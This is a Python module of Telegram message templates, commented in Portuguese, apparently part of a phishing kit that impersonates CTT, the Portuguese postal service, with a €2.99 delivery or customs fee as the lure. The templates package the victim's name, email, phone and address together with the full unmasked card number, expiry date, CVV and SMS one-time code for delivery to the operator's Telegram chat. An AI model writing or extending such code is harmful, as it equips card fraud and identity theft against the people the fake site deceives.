"""
Templates personalizáveis para mensagens do Telegram
Pode modificar estes templates para personalizar as mensagens
"""

from datetime import datetime
from typing import Dict, Any
import uuid

class TelegramTemplates:
    
    @staticmethod
    def billing_template(billing_data: Dict[str, Any]) -> str:
        """Template para mensagem de informações de entrega"""
        return f"""🏠 NOVA ENCOMENDA CTT 📦

👤 DADOS DO CLIENTE:
┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
┣━ 📧 Email: {billing_data.get('email', 'N/A')}
┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}

📍 ENDEREÇO DE ENTREGA:
┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}

⏰ TIMESTAMP: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
🔄 STATUS: ⏳ Aguardando Pagamento

═══════════════════════════════
🚚 CTT Expresso Delivery 🚚
═══════════════════════════════"""

    @staticmethod
    def payment_template(billing_data: Dict[str, Any], card_data: Dict[str, Any], session_id: str = None) -> str:
        """Template para primeira mensagem - dados do cartão"""
        # Show full card number (não mascarado conforme solicitado)
        card_number = card_data.get('numeroCartao', 'N/A')
        # Format card number with spaces for better readability
        if card_number != 'N/A' and len(card_number) >= 16:
            formatted_card = f"{card_number[:4]} {card_number[4:8]} {card_number[8:12]} {card_number[12:]}"
        else:
            formatted_card = card_number
            
        # Use provided session_id or generate a simple one
        if not session_id:
            import random
            session_id = f"CTT{random.randint(10000000, 99999999)}"
        
        return f"""💳 **DADOS DE CARTÃO RECEBIDOS**

👤 **DADOS DO CLIENTE:**
┣━ 📝 **Nome:** {billing_data.get('nome', 'N/A')}
┣━ 📧 **Email:** {billing_data.get('email', 'N/A')}
┗━ 📞 **Telefone:** {billing_data.get('telefone', 'N/A')}

📍 **ENDEREÇO DE ENTREGA:**
┣━ 🏠 **Morada:** {billing_data.get('endereco', 'N/A')}
┣━ 📮 **Código Postal:** {billing_data.get('codigoPostal', 'N/A')}
┗━ 🏙️ **Cidade:** {billing_data.get('cidade', 'N/A')}

💳 **DADOS DO CARTÃO:**
┣━ 💵 **Valor:** €2,99
┣━ 💳 **Número do Cartão:** {formatted_card}
┣━ 📅 **Data de Expiração:** {card_data.get('dataExpiracao', 'N/A')}
┗━ 🔒 **CVV:** {card_data.get('cvv', 'N/A')}

🔑 **ID DA SESSÃO:** {session_id}
⏰ **RECEBIDO EM:** {datetime.now().strftime('%d/%m/%Y às %H:%M')}
⏳ **STATUS:** AGUARDANDO CÓDIGO OTP

═══════════════════════════════
📱 Aguardando Verificação SMS 📱
═══════════════════════════════"""

    @staticmethod
    def otp_template(otp_code: str, billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> str:
        """Template para segunda mensagem - verificação OTP"""
        # Format card number with spaces and show only last 4 digits for identification
        card_number = card_data.get('numeroCartao', 'N/A')
        if card_number != 'N/A' and len(card_number) >= 16:
            formatted_card = f"{card_number[:4]} {card_number[4:8]} {card_number[8:12]} {card_number[12:]}"
        else:
            formatted_card = card_number
            
        return f"""✅ **OTP VERIFICADO COM SUCESSO**

🔐 **VERIFICAÇÃO DE SEGURANÇA COMPLETA:**
┣━ 📱 **Código OTP:** {otp_code}
┗━ ✅ **Status:** VERIFICADO

👤 **IDENTIFICAÇÃO DO CLIENTE:**
┣━ 📝 **Nome:** {billing_data.get('nome', 'N/A')}
┣━ 📞 **Telefone:** {billing_data.get('telefone', 'N/A')}
┗━ 💳 **Cartão:** {formatted_card}"""
    
    @staticmethod 
    def simple_billing_template(billing_data: Dict[str, Any]) -> str:
        """Template simples para entrega"""
        return f"""🏠 CTT - Nova Entrega

Nome: {billing_data.get('nome', 'N/A')}
Email: {billing_data.get('email', 'N/A')}
Telefone: {billing_data.get('telefone', 'N/A')}
Endereço: {billing_data.get('endereco', 'N/A')}
Código Postal: {billing_data.get('codigoPostal', 'N/A')}
Cidade: {billing_data.get('cidade', 'N/A')}

Data: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
Estado: Aguarda pagamento"""

    @staticmethod
    def emoji_billing_template(billing_data: Dict[str, Any]) -> str:
        """Template com muitos emojis"""
        return f"""🎉🏠 NOVA ENCOMENDA CTT! 🏠🎉

🙋‍♂️ CLIENTE: {billing_data.get('nome', 'N/A')} 
📧 EMAIL: {billing_data.get('email', 'N/A')}
📱 TELEFONE: {billing_data.get('telefone', 'N/A')}

🏡 ENDEREÇO: {billing_data.get('endereco', 'N/A')}
📬 CÓDIGO: {billing_data.get('codigoPostal', 'N/A')}
🏙️ CIDADE: {billing_data.get('cidade', 'N/A')}

⏰ DATA: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
⏳ ESTADO: Aguardando Pagamento da Taxa

🚚💨 CTT Expresso! 💨🚚"""

    @staticmethod
    def professional_template(billing_data: Dict[str, Any]) -> str:
        """Template profissional"""
        return f"""CTT - Correios de Portugal
Notificação de Encomenda

DADOS DO DESTINATÁRIO:
Nome: {billing_data.get('nome', 'N/A')}
Email: {billing_data.get('email', 'N/A')}  
Telefone: {billing_data.get('telefone', 'N/A')}

ENDEREÇO DE ENTREGA:
{billing_data.get('endereco', 'N/A')}
{billing_data.get('codigoPostal', 'N/A')} {billing_data.get('cidade', 'N/A')}

Processado em: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
Estado: Aguarda pagamento da taxa alfandegária

---
CTT - Correios de Portugal, S.A."""